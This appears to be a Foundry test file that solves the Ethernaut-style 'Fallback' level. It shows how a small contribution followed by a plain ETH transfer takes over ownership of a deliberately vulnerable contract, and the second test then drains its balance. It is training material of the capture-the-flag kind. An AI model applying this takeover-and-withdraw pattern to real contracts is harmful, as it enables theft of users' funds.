//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Fallback} from "../src/level2.sol";
import {Test, console} from "forge-std/Test.sol";

contract FallbackTest is Test {
    Fallback public _fallback;
    address public player;
    address public attacker;
    address public attacker2 = makeAddr("attacker2");

    function setUp() public {
        player = address(0x344);
        attacker = address(0x457);
        vm.deal(player, 10 ether); // Give player some ETH
        vm.deal(attacker, 10 ether);
        vm.deal(attacker2, 10 ether);
        vm.startPrank(player);
        _fallback = new Fallback();
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(attacker);
        // Contribute to the contract
        _fallback.contribute{value: 0.0001 ether}();
        assertEq(
            _fallback.getContribution(),
            0.0001 ether,
            "contribution failed"
        );

        // Call the fallback function
        (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
        require(success, "Fallback call failed");

        // Check if the attacker is now the owner
        assertEq(
            _fallback.owner(),
            attacker,
            "Attacker is not the owner after fallback"
        );
    }

    function test_withdraw() public {
        vm.startPrank(attacker2);
        _fallback.contribute{value: 0.0001 ether}();
        _fallback.contribute{value: 0.0001 ether}();
        vm.stopPrank();
        vm.startPrank(attacker);
        _fallback.contribute{value: 0.0001 ether}();
        (bool success, ) = address(_fallback).call{value: 0.001 ether}("");
        require(success, "Fallback call failed");
        uint256 balanceBefore = address(_fallback).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Attacker balance : ", attackerBalanceBefore);
        console.log("owner of the contract", _fallback.owner());
        console.log("contract balance before withdraw: ", balanceBefore);
        // Withdraw the funds
        _fallback.withdraw();

        // Check if the attacker has received the funds
        assertTrue(
            attacker.balance >= balanceBefore,
            "Attacker did not receive the funds"
        );
        console.log("Attacker balance after withdraw: ", attacker.balance);
        assertTrue(
            address(_fallback).balance == 0,
            "Contract balance is not zero after withdraw"
        );
    }
}
